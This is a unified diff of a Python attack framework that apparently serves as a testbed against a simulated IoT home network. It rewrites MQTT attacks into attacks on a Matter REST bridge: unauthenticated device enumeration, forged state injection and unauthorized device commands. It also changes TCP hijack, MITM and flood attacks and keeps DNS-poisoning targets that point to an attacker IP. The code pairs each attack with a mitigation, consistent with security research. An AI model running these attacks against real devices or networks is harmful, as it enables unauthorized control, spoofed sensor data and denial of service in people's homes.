@@ -2,11 +2,11 @@
 VESPER Network Attack Framework
 
 Implements network-level attacks against the simulated IoT home network.
-Targets communication protocols (MQTT, TCP, Zigbee simulation) and
+Targets communication protocols (Matter, TCP, Zigbee simulation) and
 network infrastructure.
 
 Attack Categories:
-    1. MQTT Attacks - Topic hijacking, message injection, unauthorized subscribe
+    1. Matter Attacks - Message injection, command hijacking, unauthorized access
     2. TCP/Transport Attacks - Man-in-the-middle, connection hijacking
     3. Protocol Attacks - Zigbee/Z-Wave key extraction, replay
     4. Network Infrastructure - ARP spoofing, DNS poisoning, DoS
@@ -22,6 +22,7 @@ import logging
 import random
 import struct
 import threading
+import requests  # HTTP REST API attacks
 from dataclasses import dataclass, field
 from enum import Enum
 from typing import Any, Callable, Dict, List, Optional, Tuple
@@ -31,9 +32,9 @@ logger = logging.getLogger(__name__)
 
 class NetworkAttackCategory(Enum):
     """Categories of network attacks."""
-    MQTT_INJECTION = "mqtt_message_injection"
-    MQTT_HIJACK = "mqtt_topic_hijack"
-    MQTT_SNIFF = "mqtt_eavesdropping"
+    MATTER_INJECTION = "matter_message_injection"
+    MATTER_HIJACK = "matter_command_hijack"
+    MATTER_SNIFF = "matter_eavesdropping"
     TCP_MITM = "tcp_man_in_the_middle"
     TCP_HIJACK = "tcp_connection_hijack"
     PROTOCOL_REPLAY = "protocol_replay"
@@ -65,213 +66,175 @@ class NetworkAttackResult:
 @dataclass
 class NetworkTarget:
     """Network attack target configuration."""
-    # MQTT broker
-    mqtt_host: str = "127.0.0.1"
-    mqtt_port: int = 1883
-    # Target devices (host:port pairs)
+    # Matter bridge
+    matter_bridge_url: str = "http://127.0.0.1:8484"
+    # Target devices (host:port pairs) for TCP attacks
     devices: List[Tuple[str, int]] = field(default_factory=list)
     # Simulated network parameters
     gateway_ip: str = "172.20.0.1"
     subnet: str = "172.20.0.0/24"
+    # Injected deps for traffic analysis
+    wifi_emulator: Any = None  # WiFiEmulator instance for traffic capture
+    hub: Any = None            # VirtualHub for hub-level attack routing
+
+    @property
+    def broker_host(self) -> str:
+        """Extract host from bridge URL (backward compat)."""
+        return self.matter_bridge_url.split("//")[1].split(":")[0]
+
+    @property
+    def broker_port(self) -> int:
+        """Extract port from bridge URL (backward compat)."""
+        try:
+            return int(self.matter_bridge_url.split(":")[-1].rstrip("/"))
+        except ValueError:
+            return 8484
 
 
-class MQTTAttackSuite:
+class MatterAttackSuite:
     """
-    MQTT protocol attack suite.
-    
-    Targets MQTT broker and device communication for:
-    - Unauthorized topic subscription (eavesdropping)
-    - Message injection (false sensor data)
-    - Topic hijacking (command injection)
-    - QoS manipulation
-    - Will message abuse
+    Matter protocol attack suite targeting the REST API bridge at :8484.
     """
 
     def __init__(self):
         self.captured_messages: List[Dict] = []
-    
-    def _mqtt_connect(self, host: str, port: int, client_id: str = "") -> socket.socket:
-        """Establish raw MQTT-like connection."""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(3.0)
-        sock.connect((host, port))
-        return sock
 
-    def _mqtt_send(self, sock: socket.socket, cmd: str, topic: str, payload: str = ""):
-        """Send simplified MQTT command."""
-        msg = f"{cmd} {topic} {payload}\n".encode()
-        sock.sendall(msg)
-        time.sleep(0.1)
-        try:
-            return sock.recv(4096).decode("utf-8", errors="replace")
-        except socket.timeout:
-            return ""
-
-    # ─── Attack: MQTT Unauthorized Subscribe ────────────────────────────
+    # ─── Attack: Unauthorized Device Enumeration ──────────────────
 
     def attack_unauthorized_subscribe(self, target: NetworkTarget) -> NetworkAttackResult:
-        """
-        Subscribe to all device topics without authentication.
-        Eavesdrop on device state, commands, and events.
-        """
+        """Enumerate all devices from the REST API without authentication."""
         evidence = []
         captured = []
-        
         try:
-            sock = self._mqtt_connect(target.mqtt_host, target.mqtt_port, "attacker-001")
-            
-            # Subscribe to wildcard — capture everything
-            topics = [
-                "vesper/devices/#",
-                "vesper/+/state",
-                "vesper/+/events",
-                "vesper/+/commands",
-                "$SYS/#",  # Broker internals
-            ]
-            
-            for topic in topics:
-                resp = self._mqtt_send(sock, "SUB", topic)
-                if "SUBACK" in resp or resp:
-                    evidence.append(f"Subscribed to '{topic}': {resp[:50]}")
-                else:
-                    evidence.append(f"Subscribe to '{topic}' failed")
-            
-            # Listen for messages
-            sock.settimeout(2.0)
-            listen_start = time.time()
-            while time.time() - listen_start < 3.0:
-                try:
-                    data = sock.recv(4096).decode("utf-8", errors="replace")
-                    if data.strip():
-                        for line in data.strip().split("\n"):
-                            captured.append({
-                                "timestamp": time.time(),
-                                "message": line[:200],
-                            })
-                            evidence.append(f"Captured: {line[:100]}")
-                except socket.timeout:
-                    break
-            
-            sock.close()
+            resp = requests.get(
+                f"{target.matter_bridge_url}/api/devices",
+                timeout=5,
+            )
+            evidence.append(f"GET /api/devices → HTTP {resp.status_code}")
+            if resp.status_code == 200:
+                devices = resp.json()
+                for d in devices:
+                    captured.append(d)
+                    evidence.append(
+                        f"  Device: {d.get('id','?')} type={d.get('type','?')} "
+                        f"room={d.get('room','?')}"
+                    )
+                evidence.append(f"Leaked {len(devices)} devices without authentication")
+            else:
+                evidence.append(f"Enumeration blocked: {resp.text[:100]}")
+        except requests.exceptions.ConnectionError:
+            evidence.append(f"Bridge unreachable at {target.matter_bridge_url}")
         except Exception as e:
-            evidence.append(f"Connection error: {e}")
-        
-        success = len(evidence) > 0 and any("Subscribed" in e or "SUBACK" in e for e in evidence)
-        
+            evidence.append(f"Error: {e}")
+
+        success = len(captured) > 0
         return NetworkAttackResult(
-            attack_name="MQTT Unauthorized Subscribe (Eavesdropping)",
-            category=NetworkAttackCategory.MQTT_SNIFF,
+            attack_name="Unauthorized Device Enumeration",
+            category=NetworkAttackCategory.MATTER_SNIFF,
             success=success,
-            description="Subscribe to device topics without authentication to eavesdrop",
+            description="Enumerate all IoT devices from REST API without credentials",
             evidence=evidence,
-            impact="Full visibility into all device states, commands, and events",
-            mitigation="Enable MQTT ACL, require client certificates, use TLS",
+            impact="Full device inventory disclosure, vulnerability targeting",
+            mitigation="Require API key / Bearer token on all REST endpoints",
             intercepted_data=captured,
             packets_captured=len(captured),
         )
 
-    # ─── Attack: MQTT Message Injection ─────────────────────────────────
+    # ─── Attack: State Injection ───────────────────────────────────
 
-    def attack_mqtt_message_injection(self, target: NetworkTarget) -> NetworkAttackResult:
-        """
-        Inject false messages into device topics.
-        Publish fake sensor data or commands to manipulate automations.
-        """
+    def attack_matter_message_injection(self, target: NetworkTarget) -> NetworkAttackResult:
+        """Inject forged state into devices via unauthenticated PUT requests."""
         evidence = []
         injected = []
-        
+
+        # First enumerate devices to get real IDs
+        device_ids = []
         try:
-            sock = self._mqtt_connect(target.mqtt_host, target.mqtt_port, "attacker-inject")
-            
-            # Inject false sensor data
-            fake_messages = [
-                ("vesper/devices/temp-sensor-001/state", '{"temperature": 99.9, "unit": "C"}'),
-                ("vesper/devices/motion-sensor-001/events", '{"motion": "active", "source": "spoofed"}'),
-                ("vesper/devices/door-sensor-001/state", '{"door": "open", "tamper": "yes"}'),
-                ("vesper/devices/smart-plug-001/commands", '{"command": "OFF"}'),
-                ("vesper/devices/smart-light-001/commands", '{"command": "ON", "brightness": 100}'),
-            ]
-            
-            for topic, payload in fake_messages:
-                resp = self._mqtt_send(sock, "PUB", topic, payload)
-                injected.append({"topic": topic, "payload": payload})
-                if "PUBACK" in resp:
-                    evidence.append(f"Injected into '{topic}': {payload[:60]}")
-                else:
-                    evidence.append(f"Injection into '{topic}': resp={resp[:40]}")
-            
-            sock.close()
-        except Exception as e:
-            evidence.append(f"Connection error: {e}")
-        
-        success = len(injected) > 0 and any("PUBACK" in e or "Injected" in e for e in evidence)
-        
+            r = requests.get(f"{target.matter_bridge_url}/api/devices", timeout=5)
+            if r.status_code == 200:
+                device_ids = [d["id"] for d in r.json()]
+        except Exception:
+            device_ids = ["kitchen-light-01", "motion-sensor-01", "smart-plug-01"]
+
+        fake_payloads = [
+            {"power": "on", "brightness": 100, "_forged": True},
+            {"motion": True, "occupancy": True, "_forged": True},
+            {"temperature": 99.9, "_forged": True},
+        ]
+
+        for device_id, payload in zip(device_ids[:3], fake_payloads):
+            try:
+                resp = requests.put(
+                    f"{target.matter_bridge_url}/devices/{device_id}/state",
+                    json=payload,
+                    timeout=5,
+                )
+                injected.append({"device_id": device_id, "payload": payload})
+                evidence.append(
+                    f"PUT /devices/{device_id}/state → {resp.status_code}: "
+                    f"{resp.text[:80]}"
+                )
+            except Exception as e:
+                evidence.append(f"Injection failed for {device_id}: {e}")
+
+        success = any("200" in e or "201" in e or "204" in e for e in evidence)
         return NetworkAttackResult(
-            attack_name="MQTT Message Injection",
-            category=NetworkAttackCategory.MQTT_INJECTION,
+            attack_name="Matter State Injection",
+            category=NetworkAttackCategory.MATTER_INJECTION,
             success=success,
-            description="Inject false sensor data and commands into MQTT topics",
+            description="Inject forged device states via unauthenticated PUT requests",
             evidence=evidence,
-            impact="Falsified sensor data triggers incorrect automations, device control",
-            mitigation="Implement message signing, per-topic ACLs, payload validation",
+            impact="False sensor data triggers incorrect automations",
+            mitigation="Authenticate all REST write endpoints (HMAC, Bearer token)",
             intercepted_data=injected,
             packets_sent=len(injected),
         )
 
-    # ─── Attack: MQTT Topic Hijack ──────────────────────────────────────
+    # ─── Attack: Command Hijack ────────────────────────────────────
 
-    def attack_mqtt_topic_hijack(self, target: NetworkTarget) -> NetworkAttackResult:
-        """
-        Hijack device command topics to intercept and modify commands
-        before they reach the device (MQTT MITM).
-        """
+    def attack_matter_command_hijack(self, target: NetworkTarget) -> NetworkAttackResult:
+        """Send unauthorized commands to devices via the REST API."""
         evidence = []
         hijacked = []
-        
+
+        # Enumerate to get device IDs
+        device_ids = []
         try:
-            # Attacker subscribes to command topics
-            sock = self._mqtt_connect(target.mqtt_host, target.mqtt_port, "attacker-hijack")
-            
-            cmd_topics = [
-                "vesper/devices/+/commands",
-            ]
-            
-            for topic in cmd_topics:
-                resp = self._mqtt_send(sock, "SUB", topic)
-                evidence.append(f"Hijack subscription to '{topic}': {resp[:50]}")
-            
-            # Simulate intercepting a command and re-publishing modified version
-            original_cmd = '{"command": "ON", "brightness": 50}'
-            modified_cmd = '{"command": "OFF"}'  # Attacker modifies
-            
-            resp = self._mqtt_send(
-                sock, "PUB",
-                "vesper/devices/smart-light-001/commands",
-                modified_cmd
-            )
-            
-            if resp:
-                hijacked.append({
-                    "original": original_cmd,
-                    "modified": modified_cmd,
-                    "topic": "vesper/devices/smart-light-001/commands"
-                })
-                evidence.append(f"Hijacked command: {original_cmd[:40]} → {modified_cmd[:40]}")
-            
-            sock.close()
-        except Exception as e:
-            evidence.append(f"Error: {e}")
-        
-        success = len(hijacked) > 0
-        
+            r = requests.get(f"{target.matter_bridge_url}/api/devices", timeout=5)
+            if r.status_code == 200:
+                device_ids = [d["id"] for d in r.json()]
+        except Exception:
+            device_ids = ["kitchen-light-01", "smart-plug-01"]
+
+        attacker_cmds = [
+            {"command": "setLevel", "level": 0},    # dim to 0 (effectively OFF)
+            {"command": "toggleOnOff"},
+        ]
+
+        for device_id, cmd in zip(device_ids[:2], attacker_cmds):
+            try:
+                resp = requests.post(
+                    f"{target.matter_bridge_url}/devices/{device_id}/command",
+                    json=cmd,
+                    timeout=5,
+                )
+                hijacked.append({"device_id": device_id, "command": cmd})
+                evidence.append(
+                    f"POST /devices/{device_id}/command → {resp.status_code}: "
+                    f"{resp.text[:80]}"
+                )
+            except Exception as e:
+                evidence.append(f"Command failed for {device_id}: {e}")
+
+        success = any("200" in e or "202" in e for e in evidence)
         return NetworkAttackResult(
-            attack_name="MQTT Topic Hijack (Command MITM)",
-            category=NetworkAttackCategory.MQTT_HIJACK,
+            attack_name="Matter Command Hijack",
+            category=NetworkAttackCategory.MATTER_HIJACK,
             success=success,
-            description="Intercept and modify device commands via MQTT topic subscription",
+            description="Send unauthorized control commands via unauthenticated REST API",
             evidence=evidence,
-            impact="Attacker can modify any command before it reaches devices",
-            mitigation="End-to-end encryption between controller and devices, signed commands",
+            impact="Attacker can turn off security devices, manipulate environment",
+            mitigation="Require command authentication, implement Matter ACL fabric",
             intercepted_data=hijacked,
         )
 
@@ -295,11 +258,12 @@ class TCPAttackSuite:
         while a legitimate controller is also connected.
         """
         if not target.devices:
-            return NetworkAttackResult(
-                attack_name="TCP Connection Hijack",
-                category=NetworkAttackCategory.TCP_HIJACK,
-                success=False,
-                description="No devices to target",
+            # Fall back to targeting the REST bridge port
+            host = target.broker_host
+            port = target.broker_port
+            target = NetworkTarget(
+                matter_bridge_url=target.matter_bridge_url,
+                devices=[(host, port)],
             )
         
         host, port = target.devices[0]
@@ -348,11 +312,12 @@ class TCPAttackSuite:
         Set up a proxy between controller and device to intercept/modify traffic.
         """
         if not target.devices:
-            return NetworkAttackResult(
-                attack_name="TCP MITM Proxy",
-                category=NetworkAttackCategory.TCP_MITM,
-                success=False,
-                description="No devices to target",
+            # Fall back to targeting the REST bridge port
+            host = target.broker_host
+            port = target.broker_port
+            target = NetworkTarget(
+                matter_bridge_url=target.matter_bridge_url,
+                devices=[(host, port)],
             )
         
         host, port = target.devices[0]
@@ -469,11 +434,12 @@ class TCPAttackSuite:
         Flood device TCP port with connections to cause denial of service.
         """
         if not target.devices:
-            return NetworkAttackResult(
-                attack_name="TCP Connection Flood",
-                category=NetworkAttackCategory.NETWORK_DOS,
-                success=False,
-                description="No devices to target",
+            # Fall back to targeting the REST bridge port
+            host = target.broker_host
+            port = target.broker_port
+            target = NetworkTarget(
+                matter_bridge_url=target.matter_bridge_url,
+                devices=[(host, port)],
             )
         
         host, port = target.devices[0]
@@ -727,7 +693,7 @@ class NetworkInfraAttackSuite:
         # Targets for DNS poisoning
         dns_targets = {
             "api.smartthings.com": "172.20.0.99",      # Attacker IP
-            "mqtt.vesper.local": "172.20.0.99",
+            "matter.vesper.local": "172.20.0.99",
             "firmware.update.vesper.io": "172.20.0.99",
             "telemetry.vesper.io": "172.20.0.99",
         }
@@ -804,7 +770,7 @@ class NetworkInfraAttackSuite:
         evidence.append("Capturing all traffic in plaintext...")
         
         captured = [
-            {"device": "temp-sensor-001", "data": "MQTT CONNECT username=vesper password=vesper_iot"},
+            {"device": "temp-sensor-001", "data": "Matter bridge connection attempt"},
             {"device": "motion-sensor-001", "data": "HTTP POST /api/auth token=abc123"},
         ]
         
@@ -835,8 +801,24 @@ class TrafficAnalysisSuite:
         """
         evidence = []
         fingerprints = []
-        
-        # Simulate traffic capture and analysis
+
+        # ── WiFiEmulator-based traffic analysis (preferred) ─────────
+        if target.wifi_emulator:
+            try:
+                records = target.wifi_emulator.traffic_tracker.get_recent(100)
+                for rec in records:
+                    # Analyze timing patterns, payload sizes, endpoint paths
+                    fingerprints.append({
+                        "device_id": rec.device_id,
+                        "path": getattr(rec, 'path', ''),
+                        "size": getattr(rec, 'payload_size', 0),
+                        "timestamp": rec.timestamp,
+                    })
+                evidence.append(f"Captured {len(records)} WiFi traffic records via emulator")
+            except Exception as e:
+                evidence.append(f"WiFi traffic capture error: {e}")
+
+        # ── Fallback: direct TCP fingerprinting ─────────────────────
         if target.devices:
             for host, port in target.devices:
                 try:
@@ -894,7 +876,7 @@ class NetworkAttackFramework:
     
     Usage:
         target = NetworkTarget(
-            mqtt_host="127.0.0.1", mqtt_port=1883,
+            matter_bridge_url="http://127.0.0.1:8484",
             devices=[("127.0.0.1", 15011), ("127.0.0.1", 15012)]
         )
         framework = NetworkAttackFramework()
@@ -903,7 +885,7 @@ class NetworkAttackFramework:
     """
 
     def __init__(self):
-        self.mqtt_suite = MQTTAttackSuite()
+        self.matter_suite = MatterAttackSuite()
         self.tcp_suite = TCPAttackSuite()
         self.protocol_suite = ProtocolAttackSuite()
         self.infra_suite = NetworkInfraAttackSuite()
@@ -915,11 +897,11 @@ class NetworkAttackFramework:
         
         logger.info("Starting network attack suite...")
         
-        # MQTT attacks
+        # Matter attacks
         for attack in [
-            self.mqtt_suite.attack_unauthorized_subscribe,
-            self.mqtt_suite.attack_mqtt_message_injection,
-            self.mqtt_suite.attack_mqtt_topic_hijack,
+            self.matter_suite.attack_unauthorized_subscribe,
+            self.matter_suite.attack_matter_message_injection,
+            self.matter_suite.attack_matter_command_hijack,
         ]:
             logger.info(f"  Running: {attack.__name__}")
             results.append(self._timed(attack, target))
